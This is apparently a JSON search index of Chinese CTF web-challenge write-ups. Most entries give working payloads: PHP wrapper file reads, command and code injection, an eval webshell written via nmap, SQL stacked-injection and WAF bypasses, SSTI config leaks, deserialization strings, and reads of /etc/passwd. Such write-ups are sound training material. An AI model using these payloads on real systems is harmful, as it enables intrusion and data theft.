array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);    function gettime($func, $p) &#123;        $result = call_user_func($func, $p);        $a= gettype($result);        if ($a == &quot;string&quot;) &#123;            return $result;        &#125; else &#123;return &quot;&quot;;&#125;    &#125;    class Test &#123;        var $p = &quot;Y-m-d h:i:s a&quot;;        var $func = &quot;date&quot;;        function __destruct() &#123;            if ($this-&gt;func != &quot;&quot;) &#123;                echo gettime($this-&gt;func, $this-&gt;p);            &#125;        &#125;    &#125;    $func = $_REQUEST[&quot;func&quot;];    $p = $_REQUEST[&quot;p&quot;];    if ($func != null) &#123;        $func = strtolower($func);        if (!in_array($func,$disable_fun)) &#123;            echo gettime($func, $p);        &#125;else &#123;            die(&quot;Hacker...&quot;);        &#125;    &#125;    ?&gt;\n\n观察源码，好多函数被ban，还存在一个class类  可以尝试 用 反序列化进行绕过。\n\n读取tmp文件夹\n\n读取这个文件 即可。\n\n得到flag。\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"GKCTF2020之CheckIN","url":"https://husins.cn/GKCTF2020之CheckIN/","content":"知识点\nphp7-gc-bypass漏洞利用PHP garbage collector程序中的堆溢出触发进而执行命令影响范围是linux，php7.0-7.3\n解题\n&lt;title&gt;Check_In&lt;/title&gt;&lt;?php highlight_file(__FILE__);class ClassName&#123;        public $code = null;        public $decode = null;        function __construct()        &#123;                $this-&gt;code = @$this-&gt;x()[&#x27;Ginkgo&#x27;];                $this-&gt;decode = @base64_decode( $this-&gt;code );                @Eval($this-&gt;decode);        &#125;        public function x()        &#123;                return $_REQUEST;        &#125;&#125;new ClassName();\n\n观察源代码，我们 不难发现，Get传参Ginkgo，$this-&gt;decode可以进行命令执行，尝试上传 一句话木马，连接蚁剑。\n\n发现flag在根目录但是 没有 权限 下面 存在 一个readflag函数，猜测应该是通过readflag这个文件来读取flag文件。\n\n打开之后发现是 一堆乱码。裂开。\n\n看一下phpinfo(); php版本是7.3.18 百度 是否存在 cve漏洞。\n\n果然 存在 远程代码执行漏洞， 直接 网上 找到 exp 利用\nexp地址：\nhttps://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php\n\n\n下载 之后 利用 命令执行漏洞 执行 readflag 文件 读取 flag\n因为 一般 情况下 tmp 文件夹权限 都比较高，因此 上传到tmp文件夹。\n\n上传之后，get传参 包含 这个文件 即可\n\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"BJDCTF2020之ZJCTF，不过如此","url":"https://husins.cn/BJDCTF2020之ZJCTF，不过如此/","content":"知识点\npreg_replace(): The /e modifier is deprecated, use preg_replace_callback instead这个修饰符的意思 就是让 正则替换的 时候 替换规则 支持 php 代码 参考文章：https://xz.aliyun.com/t/2557\n\n解题\n\n分析代码,ge传入两个参数text和file,text参数利用file_get_contents()函数只读形式打开，打开后内容要与”I have a dream”字符串相匹配，才能执行下面的文件包含$file参数。看到用的是file_get_contents()函数打开text参数，以及后面的文件包含函数，自然的想到php伪协议中的data://协议\n构造payload\nindex.php?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php\n\n读取到next.php文件的内容\n&lt;?php$id = $_GET[&#x27;id&#x27;];$_SESSION[&#x27;id&#x27;] = $id;function complex($re, $str) &#123;    return preg_replace(        &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,        &#x27;strtolower(&quot;\\\\1&quot;)&#x27;,        $str    );&#125;foreach($_GET as $re =&gt; $str) &#123;    echo complex($re, $str). &quot;\\n&quot;;&#125;function getFlag()&#123;\t@eval($_GET[&#x27;cmd&#x27;]);&#125;\n\n这里存在  /e  也就是 preg_replace 远程命令执行漏洞。\n思路是利用这个代码执行，执行源码中的getFlag()函数，在传入cmd参数，再利用getFlag中的eval（）函数，再进行一个代码执行。俄罗斯套娃。\n因此 构造 payload\nnext.php?\\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"GWCTF 2019之我有一个数据库","url":"https://husins.cn/GWCTF-2019之我有一个数据库/","content":"知识点\nphpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）\n解题\n\n打开题目 啥也没有 dirsearch 扫出来一个phpmyadmin的后台，观察版本，phpmyadmin 4.8.1存在任意文件读取漏洞。直接冲\n\n上payload的读取/etc/passwd 读取成功\n\n读取flag\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"安洵杯 2019之easy_web","url":"https://husins.cn/安洵杯-2019之1easy-web/","content":"知识点\n\nMD5强类型比较碰撞\na=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2   &amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2\n\n\n\n\n\n\nlinux 命令 混合\\ 仍能正常执行。\n\n解题\n\n一开始 面对 这道题 的思路是 F12 看到 MD5 is funny 然后 url栏 里面 存在 cmd 以为啥 命令执行bypass\n\n尝试了很多命令，发现都没有用，看来我走上了歧途\n看了 别的 大佬的 wp 发现 我忽略了 一个点 这里 还传参了 一个 img尝试 base64 解码\n\n\n\n解码的规律是 base64-&gt;base64-&gt;hex\n尝试逆推得到读取index.php\n这里 还有 一个坑 就是 Hex编码 有带%和不带%两种形式，一开始 不知道，用站长工具做了半天，也没弄出来 很伤 这道题 就是用的不带%的形式\n\n逆推之后 可以 得到index.php的base64 编码的值\n&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);$cmd &#x3D; $_GET[&#39;cmd&#39;];if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;]))     header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;&#39;);$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123;    echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;;    die(&quot;xixi～ no flag&quot;);&#125; else &#123;    $txt &#x3D; base64_encode(file_get_contents($file));    echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;    echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#39;|\\&quot;|\\&#96;|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;    echo(&quot;forbid ~&quot;);    echo &quot;&lt;br&gt;&quot;;&#125; else &#123;    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;        echo &#96;$cmd&#96;;    &#125; else &#123;        echo (&quot;md5 is funny ~&quot;);    &#125;&#125;?&gt;&lt;html&gt;&lt;style&gt;  body&#123;   background:url(.&#x2F;bj.png)  no-repeat center center;   background-size:cover;   background-attachment:fixed;   background-color:#CCCCCC;&#125;&lt;&#x2F;style&gt;&lt;body&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;\n\n\n过滤的 很严实 GET传参img 只能是大小写 数字 和 点，cmd 命令执行 还被 过滤了 一大堆，而且 要命令执行 还要 MD5 强碰撞，本来数组形式 可以绕过，但是 做了 类型转换 只能强碰撞，强碰撞 方法 就是 比较固定的\na=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2\nbypass 强类型之后 就可以 命令执行 我们 发现 dir 没有被过滤\n\n在 根目录 找到flag文件 并读取，这里 我们 知道 linux 里面 命令 混合\\仍然能 正常执行。\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"BUUCTF 2018之Online Tool","url":"https://husins.cn/BUUCTF-2018之Online-Tool/","content":"知识点：\n两个函数复用造成命令执行。\n\n这是一道nmap的题，看源码 host 传参 使我们可控的 经过两个函数后 MD5加盐编码之后 得到一个新的MD5值 生成一个 新的目录\n下一步 查看 那两不认识的函数 作用\nescapeshellarg:将参数中的字符串两侧加上&#39;,并将其中的&#39;进行转义 然后在两侧加上&#39;达到拼接的目的\nescapeshellcmd:将参数中的字符串中间的特殊字符转义,并且将落单的&#39;进行转义\n也就是说两个函数连续使用会造成&#39;未被转义,从而触发命令执行\n又看到了 生成 新的目录 ，想到 文件 写入  写入 一句话 木马\n#正常传参 利用 nmap 写入文件?host= &lt;?php eval($_PSOT[&quot;cmd&quot;]);?&gt; -oG cmd.php#经过escapeshellarg?host= &#x27;&lt;?php eval($_PSOT[&quot;cmd&quot;]);?&gt; -oG cmd.php&#x27;#经过escapeshellcmd没啥效果，linux会将&#x27;&#x27;里面的当做字符串，不会解析变量(双引号中的变量仍会解析),这样我们的shell就无法写入#从新传参?host= &#x27;&lt;?php eval($_PSOT[&quot;cmd&quot;]);?&gt; -oG cmd.php&#x27;#经过escapeshellarg?host= &#x27;\\&#x27;&lt;?php eval($_PSOT[&quot;cmd&quot;]);?&gt;&#x27; &#x27;-oG cmd.php\\&#x27; #经过escapeshellcmd?host= &#x27;&#x27;\\\\&#x27;&lt;?php eval($_PSOT[&quot;cmd&quot;]);?&gt;&#x27;&#x27; &#x27;&#x27;-oG cmd.php\\\\&#x27;&#x27;#简化一下?host= \\&lt;?php eval($_PSOT[&quot;cmd&quot;]);?&gt; -oG cmd.php \\\\&#x27;&#x27;达到效果\n\n连接菜刀 拿到flag\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"MRCTF2020之Ez_bypass","url":"https://husins.cn/MRCTF2020之Ez-bypass/","content":"[MRCTF2020]Ez_bypass知识点\nMD5强类型比较绕过，传入的两个变量均为数组 均为false可以绕过\nis_numeric函数 判断 16进制数 返回也是true 且能被%00截断\n\n解题\n\n打开题目，查看提示\n\n查看源码，存在三处绕过，MD5强类型比较绕过，传入的两个变量均为数组，且是不同的值即可，第二个$_POST传参绕过is_numeric，和“==”一般两种做法 数字结尾拼接不是数字的值，第二种%00截断\n构造payload：\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"网鼎杯2020 青龙组之AreUSerialz","url":"https://husins.cn/网鼎杯2020-青龙组之AreUSerialz/","content":"知识点\nphp强类型比较，可以通过 不同类型 达到绕过目的\nphp7.1以上版本 对类的类型定义不敏感\nfile_get_contents 伪协议文件读取\n\n&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123;    protected $op;    protected $filename;    protected $content;    function __construct() &#123;        $op = &quot;1&quot;;        $filename = &quot;/tmp/tmpfile&quot;;        $content = &quot;Hello World!&quot;;        $this-&gt;process();    &#125;    public function process() &#123;        if($this-&gt;op == &quot;1&quot;) &#123;            $this-&gt;write();        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;            $res = $this-&gt;read();            $this-&gt;output($res);        &#125; else &#123;            $this-&gt;output(&quot;Bad Hacker!&quot;);        &#125;    &#125;    private function write() &#123;        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;            if(strlen((string)$this-&gt;content) &gt; 100) &#123;                $this-&gt;output(&quot;Too long!&quot;);                die();            &#125;            $res = file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output(&quot;Successful!&quot;);            else $this-&gt;output(&quot;Failed!&quot;);        &#125; else &#123;            $this-&gt;output(&quot;Failed!&quot;);        &#125;    &#125;    private function read() &#123;        $res = &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res = file_get_contents($this-&gt;filename);        &#125;        return $res;    &#125;    private function output($s) &#123;        echo &quot;[Result]: &lt;br&gt;&quot;;        echo $s;    &#125;    function __destruct() &#123;        if($this-&gt;op === &quot;2&quot;)            $this-&gt;op = &quot;1&quot;;        $this-&gt;content = &quot;&quot;;        $this-&gt;process();    &#125;&#125;function is_valid($s) &#123;    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;    $str = (string)$_GET[&#x27;str&#x27;];    if(is_valid($str)) &#123;        $obj = unserialize($str);    &#125;&#125;\n\n将代码 分段 分析。\nfunction is_valid($s) &#123;    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;    $str = (string)$_GET[&#x27;str&#x27;];    if(is_valid($str)) &#123;        $obj = unserialize($str);    &#125;&#125;\n\nGET传参，is_valid() 判断字符串的ascii值是否在32~~125之间。存在反序列化函数，调用析构函数。下一步查看析构函数。\nfunction __destruct() &#123;        if($this-&gt;op === &quot;2&quot;)            $this-&gt;op = &quot;1&quot;;        $this-&gt;content = &quot;&quot;;        $this-&gt;process();        &#125;\n\n析构函数 判断 op 强比较 是都 等于 字符型 2  如果等于 替换为 字符型 1.，将content替换为空。 调用process函数。\n public function process() &#123;     if($this-&gt;op == &quot;1&quot;) &#123;         $this-&gt;write();     &#125; else if($this-&gt;op == &quot;2&quot;) &#123;         $res = $this-&gt;read();         $this-&gt;output($res);     &#125; else &#123;         $this-&gt;output(&quot;Bad Hacker!&quot;);     &#125; &#125;private function output($s) &#123;     echo &quot;[Result]: &lt;br&gt;&quot;;     echo $s; &#125;\n\nprocess() 完成读写功能。 我们 应该要使用读取操作 得到flag output() 是输出字符串\nprivate function read() &#123;        $res = &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res = file_get_contents($this-&gt;filename);        &#125;        return $res;    &#125;\n\n利用 file_get_contents 来读取 文件 想到 伪协议。\n整理一下思路：\n​    构造序列化字符串，让op=2 并且 利用php伪协议 读取 flag。\nop=2  可以利用 强类型 比较   要比较 类型  2是int型  “2”是string型 可以绕过。\nPHP伪协议：filename=php://filter/read=convert.base64-encode/resource=flag.php\n最后 绕过 那个 ascii码比较函数，因为protected私有化的时候会出现%00 他的ascii的值 是 0 不符合 可以使用php7.1以上版本 对类的类型定义不敏感 改为public绕过。\n构造payload\n\n?str=O:11:&quot;FileHandler&quot;:2:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;\n\n\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"攻防世界之bug","url":"https://husins.cn/攻防世界之bug/","content":"\n打开之后是个登陆页面  有 登陆 注册 改密码 功能\n\n\n注册一个test账号 发现Manage点不开提示我不是admin，因此想办法找到admin登陆，这里想到修改密码这个功能 能不能越权修改admin密码。\n\n\n这里填完信息之后，发现身份已经通过，我们可以推测逻辑是 判断身份，然后 修改密码 这时只要能够将test改为admin即可越权修改admin密码了。\n\n将这里的test改为admin成功修改admin密码\n\n\n用xff头 伪造ip 得到提示\n？？？ 尝试 flag 不可以  想到 进后台 要传马  想到upload\n\n上传图片马，然后发现有过滤，然后多次尝试发现 phtml 能够绕过，但是解析不太正常 php4 php5 可以正常  而且 一句话中不能存在 . 而且找不到上传路径 选择直接命令执行。\n\n","categories":["CTF题解"],"tags":["攻防世界"]},{"title":"攻防世界之cat","url":"https://husins.cn/攻防世界之cat/","content":"\n\n打开题目 测试提示数据，发现没有反应 看提示 是个网址 就测试127.0.0.1 发现是ping 第一反应 是命令执行\n\n但是行不通 但是 我们发现 url 传参 可以修改 编码值\n\n\n传递%80，url编码使用的是16进制，80也就是128，ASCII码是从0-127，所以这个时候会报错\n查看报错 发现 使用 的是Django\n查找api有关信息\n\n这里存在数据库相关信息。\n尝试访问\n这里要注意：\n\n因此\nhttp://220.249.52.133:30703/index.php?url=@/opt/api/database.sqlite3\n\n\n得到flag。\n","categories":["CTF题解"],"tags":["攻防世界"]},{"title":"攻防世界之shrine","url":"https://husins.cn/攻防世界之shrine/","content":"打开题目，好家伙，python，想到ssti模板注入。\nimport flask import os app = flask.Flask(__name__)          #对flask模块进行实例化app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)    #清除FLAG环境变量，并将其保存在app.config中@app.route(&#x27;/&#x27;) \tdef index():         return open(__file__).read()           #路由转发到/shrine/路径下    \t@app.route(&#x27;/shrine/&#x27;)         def shrine(shrine):     \tdef safe_jinja(s):        \t\ts = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)         \tblacklist = [&#x27;config&#x27;, &#x27;self&#x27;] \t\t\t\t#过滤 （） ，config，self        \treturn &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s     return flask.render_template_string(safe_jinja(shrine)) if __name__ == &#x27;__main__&#x27;:     app.run(debug=True)\n\n根据分析 我们应该在 /shrine/ 路径下查看 app.config[‘FLAG’] 的内容 就能得到flag。\n\nhttp://220.249.52.133:40596/shrine/&#123;&#123;4&#125;&#125;\n\n证明存在  ssti  下一步 想办法 绕过 过滤 读取 信息\n\n/shrine/&#123;&#123;url_for.__globals__&#125;&#125;globals 函数返回一个全局变量的字典，包括所有导入的变量。\n\n\n/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;]&#125;&#125;\n\n这个就是之前实例化对象app 查看 他的config即可\n\n/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125;\n\n","categories":["CTF题解"],"tags":["攻防世界"]},{"title":"护网杯2018-easy_tornado","url":"https://husins.cn/护网杯2018-easy-tornado/","content":"\n\n打开三个txt文件 获取信息如上\n\n那么接下来 思路就很清晰 只要找到 MD5里面 cookie_secret这个盐值 就可以了\n\n\n在测试url栏传参是发现，还有第四个页面 也就是报错页面，联系题目提示这里可能存在模板注入（因为关于python我知道模板注入）\n\n确认存在模板注入 接下来的思路就是 通过模板注入找到盐值，\n正确的思路就是要去看开发文档，看看什么能够读取cookie_secret\n\nhandler.settings，handler 指向RequestHandler，\n而RequestHandler.settings又指向self.application.settings，\n所以handler.settings就指向RequestHandler.application.settings了\n\n直接获取到盐值\n利用python，加密带盐的MD5值\n\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"强网杯 2019-随便注","url":"https://husins.cn/强网杯-2019-随便注/","content":"\n\n输入单引号报错，\n\n单引号闭合\n\n两个字段。\n\n好家伙，select给我ban了\n\n\n好家伙内联注释也用不了。\n\n\n堆叠注入可以，查到了库名和表名。\n\n\n分别查询 两个字段里面的信息\n在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符\n分析可知\n\n输出点应该是在 id字段\n\nflag存在于supersqli数据库中的1919810931114514表的flag字段。\n\n\n下面就要开始骚姿势了。\n由于正则字段中的数据是查询不出来了的，只有两种方式，\n\n预编译绕过正则\n\n将flag所在的表和flag都变成words和id 直接查询输出\n\n\n预编译\nset 用于设置变量名和值prepare 用于预备一个语句，并赋予名称，以后可以引用该语句execute 执行语句deallocate prepare 用来释放掉预处理的语句\n\n因此构造payload\nset  @sql&#x3D;CONCAT(&#39;se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);prepare test from @sql;EXECUTe test;\n\n1&#39;set  @sql=CONCAT(&#39;se&#39;,&#39;lect * from 1919810931114514;&#39;);prepare test from @sql;EXECUTe test;#\n\nstrstr（）函数可以大小写绕过\n修正payload：\n1&#39;;Set @sql &#x3D; CONCAT(&#39;se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);Prepare test from @sql;EXECUTe test;#\n\n\n得到flag\n修改表名\n修改表名(将表名user改为users)alter table user rename to users;修改列名(将字段名username改为name)alter table users change uesrname name varchar(30);\n\n因此构造payload：\nalert table words rename to 123;alert table &#96;1919810931114514&#96; rename to words;alert table words change flag id int(40);\n\n1&#39;;alert table words rename to     123;alert table &#96;1919810931114514&#96; rename to words;alert table words change flag id varchar(50);#\n\n\n使用1‘ or 1=1 # 得到flag。\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"网鼎杯 2018-Fakebook","url":"https://husins.cn/网鼎杯-2018-Fakebook/","content":"\n打开题目注册登录 得到如上界面\n\n查看源码，发现一个view.php\n\n输出单引号报错，可能存在sql注入，进行下一步尝试。\nview.php?no&#x3D;1 and 1&#x3D;1view.php?no&#x3D;1 and 1&#x3D;2view.php?no&#x3D;1 order by 5view.php?no&#x3D;0 union select 666,777,888,999这里发现触发了WAF，尝试内联注释，混淆绕过view.php?no&#x3D;0 &#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F; 666,777,888,999view.php?no&#x3D;0 &#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F; 666,database(),888,999库名：fakebookview.php?no&#x3D;0 &#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F; 1,table_name ,3,4 from information_schema.tables where table_schema&#x3D;&#39;fakebook&#39;表名：usersview.php?no&#x3D;0 &#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F; 1,column_name,3,4 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;字段名：no username passwd dataview.php?no&#x3D;0 &#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F; union&#x2F;**&#x2F;select 1,data,3,4 from fakebook.usersO:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:12:&quot;ww.baidu.com&quot;;&#125;\n\n得到一个反序列化串\n用dirsearch扫一遍目录啥也没有\n查看robots.txt（常用知识点一定要记住）\n\n下载下来得到 一份源码\n&lt;?phpclass UserInfo&#123;    public $name = &quot;&quot;;    public $age = 0;    public $blog = &quot;&quot;;    public function __construct($name, $age, $blog)  //赋值u    &#123;        $this-&gt;name = $name;        $this-&gt;age = (int)$age;        $this-&gt;blog = $blog;    &#125;    function get($url)  //自定义函数    &#123;\t    \t//初始化 cURL 会话        $ch = curl_init();\t\t//设置url和相对应的选项        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\t\t//抓取url并把它传递给浏览器        $output = curl_exec($ch);        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);        if($httpCode == 404) &#123;            return 404;        &#125;\t\t//关闭curl资源，并释放系统资源        curl_close($ch);\t        return $output;    &#125;    public function getBlogContents ()    &#123;        return $this-&gt;get($this-&gt;blog);    &#125;    public function isValidBlog ()    &#123;        $blog = $this-&gt;blog;        return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog);    &#125;&#125;\n\n思路明确：利用反序列化和伪协议读取直接flag.php\n\n结合之前的报错信息，可以推测路径为 /var/www/html/flag.php\n因此 写php代码 构建payload\n\n因为data是第四个字段 因此最终的payload为\nhttp://b5de29d4-cf0b-47f7-a63d-7edf1fc2a2c4.node3.buuoj.cn/view.php?no=0%20union/**/select%201,2,3,%27O:8:%22UserInfo%22:3:&#123;s:4:%22name%22;s:5:%22admin%22;s:3:%22age%22;i:123;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;&#125;%27\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"ZJCTF 2019-NiZhuanSiWei","url":"https://husins.cn/ZJCTF-2019-NiZhuanSiWei/","content":"知识点php伪协议\nhttps://www.anquanke.com/post/id/202510#h3-3\nhttps://www.cherrygk.cn/2018/07/12/phpagree/\n解题\n审计代码，需要 txt  file password三个参数，分段绕过\nif(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))\n这里需要我们对text传参，并让file_get_contents()函数读取内容为 welcome to the zjctf\n因此使用 ?text=data:text/plain,welcome to the zjctfdata://伪协议实现绕过。\n\n过滤了 关键字flag\n\n这里提示读取useless.php，因此file=useless.php。但是php文件会被解析不能输出，因此，用base64编码读取\nphp://filter/read=convert.base64-encode/resource=useless.php\n\n读取到useless.php内容\n\n反手写一个反序列化生成payload：\npassword=O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;file&quot;;N;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;\n最终payload\n?text=data:text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"BJDCTF2020 EasyMD5","url":"https://husins.cn/BJDCTF2020-EasyMD5/","content":"知识点：MD5 \n\nmd5 bypass\nmd5()或者sha1()之类的函数计算的是一个字符串的哈希值，对于数组则返回false，如果都是数组则双双返回FALSE, 两个FALSE相等得以绕过\n解题：\n\n\n输入框传参会是GET传参，查看返回包请求头发现提示，这里尝试了很多次这里我都绕不过去，一次看博客得到：\n传参?password=ffifdyop\n原理：\n经过md5加密后：276f722736c95d99e921722cf9ed621c，Mysql 刚好又会吧 hex 转成 ascii 解释，再转换为字符串：’or’6&lt;乱码&gt; 即  &#39;or&#39;66�]��!r,��b 起始。只要是万能密码就行可以采用md5截断爆破，但是我命不好跑了半小时没跑出来 就直接用网上师傅们的了。\n用途：\nselect * from admin where password=&#39;&#39;or&#39;6&lt;乱码&gt;&#39;\n就相当于select * from admin where password=&#39;&#39;or 1 实现sql注入\n\n查看源码，发现需要md5弱类型比较，有两种做法\n第一种弱类型 传入连个0e…的值e后面的会被当做科学计数法 0 = 0 实现绕过\n第二种数组编码之后会返回false false=false 实现绕过\n\n===弱类型不可以了，但是可以第二种方法\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"UNCTF之easyunserialize","url":"https://husins.cn/UNCTF之easyunserialize/","content":"知识点：PHP 在反序列化时，底层代码是以;作为字段的分隔，以&#125;作为结尾(数组、对象等类型)；反序列化时，结尾后的字符串会被忽略掉，当出现字符串替换函数得时候，就可以存在反序列化逃逸漏洞\n当替换后字符变多：由于膨胀，导致后面的字符被挤掉，所以执行我们传入的代码\n当替换后字符变少：由于缩水，导致前面的字符被吃掉了，所以执行了我们后面构造的代码\n解题：\n经过分析，构造payload。\n\n;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;\n得到我们要传入的参数（起始也可以直接写出来要是熟悉的话）\n我们发现这串字符有 29个。而我们根据替换只能控制溢出为4的倍数，因此这里有个骚姿势传入一个没有用的参数，使得我们构造的传参为4的倍数\npaylaod：&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:5:&quot;aaaaa&quot;;s:4:&quot;easy&quot;;&#125;\n此时是52个字符为4的倍数，构造脚本。\n\n\n","categories":["CTF题解"],"tags":["UNCTF"]},{"title":"# BUUCTF之[极客大挑战 